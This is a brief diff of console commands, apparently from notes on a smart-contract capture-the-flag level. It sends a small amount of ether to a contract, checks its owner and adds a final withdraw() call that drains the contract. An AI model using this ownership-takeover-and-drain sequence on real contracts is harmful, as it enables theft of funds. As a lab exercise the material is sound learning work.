@@ -20,6 +20,7 @@ await contract.sendTransaction({from:player, value:toWei("0.0001", "ether")})
 await contract.owner()
 "0x77f2Dc5d302e71Ab6645622FAB27123E52e3e035" 
 
+await contract.withdraw()
 
 ---------------------------------------------------------------------------------
 
